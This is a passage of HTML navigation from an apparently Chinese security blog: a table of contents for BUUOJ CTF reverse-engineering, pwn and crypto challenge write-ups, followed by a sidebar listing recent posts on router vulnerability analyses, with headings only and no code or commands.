class="toc-link" href="#%E8%A7%A3%E5%AF%86"><span class="toc-number">2.42.4.</span> <span class="toc-text">解密</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#findKey"><span class="toc-number">2.43.</span> <span class="toc-text">findKey</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GWCTF-2019-re3"><span class="toc-number">2.44.</span> <span class="toc-text">[GWCTF 2019]re3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%9A%84-BASE64"><span class="toc-number">2.45.</span> <span class="toc-text">特殊的 BASE64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlareOn5-Minesweeper-Championship-Registration"><span class="toc-number">2.46.</span> <span class="toc-text">[FlareOn5]Minesweeper Championship Registration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker"><span class="toc-number">2.47.</span> <span class="toc-text">[网鼎杯 2020 青龙组]jocker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-SoulLike"><span class="toc-number">2.48.</span> <span class="toc-text">[ACTF新生赛2020]SoulLike</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-xx"><span class="toc-number">2.49.</span> <span class="toc-text">[2019红帽杯]xx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlareOn5-Ultimate-Minesweeper"><span class="toc-number">2.50.</span> <span class="toc-text">[FlareOn5]Ultimate Minesweeper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlareOn1-Bob-Doge"><span class="toc-number">2.51.</span> <span class="toc-text">[FlareOn1]Bob Doge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-PixelShooter"><span class="toc-number">2.52.</span> <span class="toc-text">[MRCTF2020]PixelShooter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#equation"><span class="toc-number">2.53.</span> <span class="toc-text">equation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-childRE"><span class="toc-number">2.54.</span> <span class="toc-text">[2019红帽杯]childRE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPU2019-ReverseMe"><span class="toc-number">2.55.</span> <span class="toc-text">[SWPU2019]ReverseMe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-crackMe"><span class="toc-number">2.56.</span> <span class="toc-text">[安洵杯_2019]crackMe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CFI-CTF-2018-IntroToPE"><span class="toc-number">2.57.</span> <span class="toc-text">[CFI-CTF 2018]IntroToPE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyre"><span class="toc-number">2.58.</span> <span class="toc-text">[羊城杯 2020]easyre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-funnyre"><span class="toc-number">2.59.</span> <span class="toc-text">[WUSTCTF2020]funnyre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RoarCTF2019-polyre"><span class="toc-number">2.60.</span> <span class="toc-text">[RoarCTF2019]polyre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-login"><span class="toc-number">2.61.</span> <span class="toc-text">[羊城杯 2020]login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NPUCTF2020-%E4%BD%A0%E5%A5%BDsao%E5%95%8A"><span class="toc-number">2.62.</span> <span class="toc-text">[NPUCTF2020]你好sao啊</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UTCTF2020-babymips"><span class="toc-number">2.63.</span> <span class="toc-text">[UTCTF2020]babymips</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-game"><span class="toc-number">2.64.</span> <span class="toc-text">[安洵杯 2019]game</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GUET-CTF2019-encrypt"><span class="toc-number">2.65.</span> <span class="toc-text">[GUET-CTF2019]encrypt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SCTF2019-babyre"><span class="toc-number">2.66.</span> <span class="toc-text">[SCTF2019]babyre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMCTF2020-easy-re"><span class="toc-number">2.67.</span> <span class="toc-text">[WMCTF2020]easy_re</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-Snake"><span class="toc-number">2.68.</span> <span class="toc-text">[2019红帽杯]Snake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SCTF2019-Strange-apk"><span class="toc-number">2.69.</span> <span class="toc-text">[SCTF2019]Strange apk</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#s%E5%87%BD%E6%95%B0"><span class="toc-number">2.69.1.</span> <span class="toc-text">s函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#t%E5%87%BD%E6%95%B0"><span class="toc-number">2.69.2.</span> <span class="toc-text">t函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SCTF2019-creakme"><span class="toc-number">2.70.</span> <span class="toc-text">[SCTF2019]creakme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GKCTF-2021-QQQQT"><span class="toc-number">2.71.</span> <span class="toc-text">[GKCTF 2021]QQQQT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SCTF2019-Who-is-he"><span class="toc-number">2.72.</span> <span class="toc-text">[SCTF2019]Who is he</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlareOn2-very-success"><span class="toc-number">2.73.</span> <span class="toc-text">[FlareOn2]very_success</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2018-2ex"><span class="toc-number">2.74.</span> <span class="toc-text">[CISCN2018]2ex</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#watevrCTF-2019-Timeout"><span class="toc-number">2.75.</span> <span class="toc-text">[watevrCTF 2019]Timeout</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#No-1"><span class="toc-number">2.75.1.</span> <span class="toc-text">No.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#No-2"><span class="toc-number">2.75.2.</span> <span class="toc-text">No.2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-bang"><span class="toc-number">2.76.</span> <span class="toc-text">[网鼎杯 2020 青龙组]bang</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dig-the-way"><span class="toc-number">2.77.</span> <span class="toc-text">Dig the way</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fun0"><span class="toc-number">2.77.1.</span> <span class="toc-text">fun0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fun1"><span class="toc-number">2.77.2.</span> <span class="toc-text">fun1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fun2"><span class="toc-number">2.77.3.</span> <span class="toc-text">fun2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">2.77.4.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-EasyCpp"><span class="toc-number">2.78.</span> <span class="toc-text">[MRCTF2020]EasyCpp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF2018-babyre"><span class="toc-number">2.79.</span> <span class="toc-text">[SUCTF2018]babyre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HDCTF2019-MFC"><span class="toc-number">2.80.</span> <span class="toc-text">[HDCTF2019]MFC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Bytecode"><span class="toc-number">2.81.</span> <span class="toc-text">[羊城杯 2020]Bytecode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Splendid-MineCraft"><span class="toc-number">2.82.</span> <span class="toc-text">[ACTF新生赛2020]Splendid_MineCraft</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GWCTF-2019-babyvm"><span class="toc-number">2.83.</span> <span class="toc-text">[GWCTF 2019]babyvm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-fungame"><span class="toc-number">2.84.</span> <span class="toc-text">[ACTF新生赛2020]fungame</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NPUCTF2020-Baby-Obfuscation"><span class="toc-number">2.85.</span> <span class="toc-text">[NPUCTF2020]Baby Obfuscation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#F0X1"><span class="toc-number">2.85.1.</span> <span class="toc-text">F0X1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#F0X2"><span class="toc-number">2.85.2.</span> <span class="toc-text">F0X2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#F0X3"><span class="toc-number">2.85.3.</span> <span class="toc-text">F0X3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#F0X4"><span class="toc-number">2.85.4.</span> <span class="toc-text">F0X4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#F0X5"><span class="toc-number">2.85.5.</span> <span class="toc-text">F0X5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Main"><span class="toc-number">2.85.6.</span> <span class="toc-text">Main</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BSidesSF2019-blink"><span class="toc-number">2.86.</span> <span class="toc-text">[BSidesSF2019]blink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF2019-hardcpp"><span class="toc-number">2.87.</span> <span class="toc-text">[SUCTF2019]hardcpp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NPUCTF2020-BasicASM"><span class="toc-number">2.88.</span> <span class="toc-text">[NPUCTF2020]BasicASM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-Shit"><span class="toc-number">2.89.</span> <span class="toc-text">[MRCTF2020]Shit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HellScream"><span class="toc-number">2.90.</span> <span class="toc-text">HellScream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#De1CTF2019-Re-Sign"><span class="toc-number">2.91.</span> <span class="toc-text">[De1CTF2019]Re_Sign</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlareOn1-Javascrap"><span class="toc-number">2.92.</span> <span class="toc-text">[FlareOn1]Javascrap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#watevrCTF-2019-Repyc"><span class="toc-number">2.93.</span> <span class="toc-text">[watevrCTF 2019]Repyc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlareOn1-Shellolololol"><span class="toc-number">2.94.</span> <span class="toc-text">[FlareOn1]Shellolololol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlareOn6-Memecat-Battlestation"><span class="toc-number">2.95.</span> <span class="toc-text">[FlareOn6]Memecat Battlestation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlareOn6-FlareBear"><span class="toc-number">2.96.</span> <span class="toc-text">[FlareOn6]FlareBear</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-calc"><span class="toc-number">2.97.</span> <span class="toc-text">[2019红帽杯]calc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GKCTF-2021-Crash"><span class="toc-number">2.98.</span> <span class="toc-text">[GKCTF 2021]Crash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CFI-CTF-2018-powerPacked"><span class="toc-number">2.99.</span> <span class="toc-text">[CFI-CTF 2018]powerPacked</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlareOn4-greek-to-me"><span class="toc-number">2.100.</span> <span class="toc-text">[FlareOn4]greek_to_me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#INSHack2018-Tricky-Part1"><span class="toc-number">2.101.</span> <span class="toc-text">[INSHack2018]Tricky-Part1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-VirtualTree"><span class="toc-number">2.102.</span> <span class="toc-text">[MRCTF2020]VirtualTree</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#b01lers2020-chugga-chugga"><span class="toc-number">2.103.</span> <span class="toc-text">[b01lers2020]chugga_chugga</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCTF2019-DontEatMe"><span class="toc-number">2.104.</span> <span class="toc-text">[RCTF2019]DontEatMe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XMAN2018%E6%8E%92%E4%BD%8D%E8%B5%9B-Dragon-Quest"><span class="toc-number">2.105.</span> <span class="toc-text">[XMAN2018排位赛]Dragon Quest</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">3.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwn%E7%8E%AF%E5%A2%83"><span class="toc-number">3.1.</span> <span class="toc-text">Pwn环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#test-your-nc"><span class="toc-number">3.2.</span> <span class="toc-text">test_your_nc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rip"><span class="toc-number">3.3.</span> <span class="toc-text">rip</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">3.3.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#warmup-csaw-2016"><span class="toc-number">3.4.</span> <span class="toc-text">warmup_csaw_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-number">3.4.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-n-1"><span class="toc-number">3.5.</span> <span class="toc-text">ciscn_2019_n_1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-2"><span class="toc-number">3.5.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn1-sctf-2016"><span class="toc-number">3.6.</span> <span class="toc-text">pwn1_sctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-3"><span class="toc-number">3.6.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-level0"><span class="toc-number">3.7.</span> <span class="toc-text">jarvisoj_level0</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-4"><span class="toc-number">3.7.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-level2"><span class="toc-number">3.8.</span> <span class="toc-text">jarvisoj_level2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-5"><span class="toc-number">3.8.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0ctf-2017-babyheap"><span class="toc-number">3.9.</span> <span class="toc-text">0ctf 2017 babyheap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-c-1"><span class="toc-number">3.10.</span> <span class="toc-text">ciscn_2019_c_1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-6"><span class="toc-number">3.10.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="toc-number">3.11.</span> <span class="toc-text">[第五空间2019 决赛]PWN5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP1"><span class="toc-number">3.11.1.</span> <span class="toc-text">EXP1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP2"><span class="toc-number">3.11.2.</span> <span class="toc-text">EXP2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP3"><span class="toc-number">3.11.3.</span> <span class="toc-text">EXP3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OGeek2019-babyrop"><span class="toc-number">3.12.</span> <span class="toc-text">[OGeek2019]babyrop</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-7"><span class="toc-number">3.12.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-n-8"><span class="toc-number">3.13.</span> <span class="toc-text">ciscn_2019_n_8</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-8"><span class="toc-number">3.13.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bjdctf-2020-babystack"><span class="toc-number">3.14.</span> <span class="toc-text">bjdctf_2020_babystack</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-9"><span class="toc-number">3.14.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-en-2"><span class="toc-number">3.15.</span> <span class="toc-text">ciscn_2019_en_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#not-the-same-3dsctf-2016"><span class="toc-number">3.16.</span> <span class="toc-text">not_the_same_3dsctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP1-1"><span class="toc-number">3.16.1.</span> <span class="toc-text">EXP1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP2-1"><span class="toc-number">3.16.2.</span> <span class="toc-text">EXP2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HarekazeCTF2019-baby-rop"><span class="toc-number">3.17.</span> <span class="toc-text">[HarekazeCTF2019]baby_rop</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-10"><span class="toc-number">3.17.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-level2-x64"><span class="toc-number">3.18.</span> <span class="toc-text">jarvisoj_level2_x64</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-11"><span class="toc-number">3.18.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-n-5"><span class="toc-number">3.19.</span> <span class="toc-text">ciscn_2019_n_5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-12"><span class="toc-number">3.19.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#others-shellcode"><span class="toc-number">3.20.</span> <span class="toc-text">others_shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-ne-5"><span class="toc-number">3.21.</span> <span class="toc-text">ciscn_2019_ne_5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-13"><span class="toc-number">3.21.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop"><span class="toc-number">3.22.</span> <span class="toc-text">铁人三项(第五赛区)_2018_rop</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-14"><span class="toc-number">3.22.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bjdctf-2020-babyrop"><span class="toc-number">3.23.</span> <span class="toc-text">bjdctf_2020_babyrop</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-15"><span class="toc-number">3.23.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyheap-0ctf-2017"><span class="toc-number">3.24.</span> <span class="toc-text">babyheap_0ctf_2017</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-16"><span class="toc-number">3.24.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bjdctf-2020-babystack2"><span class="toc-number">3.25.</span> <span class="toc-text">bjdctf_2020_babystack2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-17"><span class="toc-number">3.25.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-fm"><span class="toc-number">3.26.</span> <span class="toc-text">jarvisoj_fm</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-18"><span class="toc-number">3.26.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn2-sctf-2016"><span class="toc-number">3.27.</span> <span class="toc-text">pwn2_sctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-19"><span class="toc-number">3.27.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-s-3"><span class="toc-number">3.28.</span> <span class="toc-text">ciscn_s_3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP1-2"><span class="toc-number">3.28.1.</span> <span class="toc-text">EXP1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP2-2"><span class="toc-number">3.28.2.</span> <span class="toc-text">EXP2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HarekazeCTF2019-baby-rop2"><span class="toc-number">3.29.</span> <span class="toc-text">[HarekazeCTF2019]baby_rop2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-20"><span class="toc-number">3.29.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-level3"><span class="toc-number">3.30.</span> <span class="toc-text">jarvisoj_level3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-21"><span class="toc-number">3.30.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-es-2"><span class="toc-number">3.31.</span> <span class="toc-text">ciscn_2019_es_2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-22"><span class="toc-number">3.31.1.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MD5"><span class="toc-number">4.1.</span> <span class="toc-text">MD5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Url%E7%BC%96%E7%A0%81"><span class="toc-number">4.2.</span> <span class="toc-text">Url编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E7%9C%BC%E5%B0%B1%E8%A7%A3%E5%AF%86"><span class="toc-number">4.3.</span> <span class="toc-text">一眼就解密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%8B%E6%88%91%E5%9B%9E%E6%97%8B%E8%B8%A2"><span class="toc-number">4.4.</span> <span class="toc-text">看我回旋踢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E5%BC%82%E5%87%AF%E6%92%92"><span class="toc-number">4.5.</span> <span class="toc-text">变异凯撒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Quoted-printable"><span class="toc-number">4.6.</span> <span class="toc-text">Quoted-printable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#password"><span class="toc-number">4.7.</span> <span class="toc-text">password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rsarsa"><span class="toc-number">4.8.</span> <span class="toc-text">rsarsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rabbit"><span class="toc-number">4.9.</span> <span class="toc-text">Rabbit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA"><span class="toc-number">4.10.</span> <span class="toc-text">RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81"><span class="toc-number">4.11.</span> <span class="toc-text">Windows系统密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Alice%E4%B8%8EBob"><span class="toc-number">4.12.</span> <span class="toc-text">Alice与Bob</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%B1%E7%AC%86%E5%A2%99%E7%9A%84%E5%BD%B1%E5%AD%90"><span class="toc-number">4.13.</span> <span class="toc-text">篱笆墙的影子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%81%E6%96%87%E7%9B%B2%E4%BA%86"><span class="toc-number">4.14.</span> <span class="toc-text">老文盲了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B8%9D%E7%9A%84%E5%AF%86%E7%A0%81%E6%AD%A6%E5%99%A8"><span class="toc-number">4.15.</span> <span class="toc-text">大帝的密码武器</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/note-tool-z3/" title="Z3"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files@latest/img/pexels-nick-rtr-3129443.jpg" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="Z3"></a><div class="content"><a class="title" href="/note-tool-z3/" title="Z3">Z3</a><time datetime="2022-05-14T00:43:19.000Z" title="更新于 2022-05-14 00:43:19">2022-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/CVE-d-link-dir-505/" title="D-Link Dir-505 便携路由器越界漏洞分析"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files@latest/img/pexels-sebastiaan-stam-1097456.jpg" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="D-Link Dir-505 便携路由器越界漏洞分析"></a><div class="content"><a class="title" href="/CVE-d-link-dir-505/" title="D-Link Dir-505 便携路由器越界漏洞分析">D-Link Dir-505 便携路由器越界漏洞分析</a><time datetime="2021-11-09T17:44:37.000Z" title="更新于 2021-11-09 17:44:37">2021-11-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/CVE-d-link-dir-645/" title="D-Link Dir-645 路由器溢出漏洞分析"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files@latest/img/pexels-sebastiaan-stam-1097456.jpg" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="D-Link Dir-645 路由器溢出漏洞分析"></a><div class="content"><a class="title" href="/CVE-d-link-dir-645/" title="D-Link Dir-645 路由器溢出漏洞分析">D-Link Dir-645 路由器溢出漏洞分析</a><time datetime="2021-11-08T17:44:37.000Z" title="更新于 2021-11-08 17:44:37">2021-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/wp-games-buuctf/" title="BUUOJ 题库练习"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/write_up.png" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUOJ 题库练习"></a><div class="content"><a class="title" href="/wp-games-buuctf/" title="BUUOJ 题库练习">BUUOJ 题库练习</a><time datetime="2021-11-04T19:10:31.000Z" title="更新于 2021-11-04 19:10:31">2021-11-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/CVE-d-link-dir-815/" title="D-Link DIR-815 路由器多次溢出漏洞分析"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" 